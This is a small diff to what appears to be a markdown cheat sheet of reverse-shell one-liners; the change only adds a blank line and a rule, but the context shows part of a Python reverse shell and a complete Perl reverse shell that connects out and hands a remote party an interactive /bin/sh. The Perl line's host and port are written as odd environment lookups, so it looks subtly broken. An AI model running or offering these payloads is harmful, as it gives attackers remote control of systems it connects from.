@@ -88,3 +88,5 @@ python -c 'import sys,socket,os,pty;s=socket.socket()
 
 ### Reverse shell > <a name="reverse_shell_perl"></a>Perl
 ###### perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+____
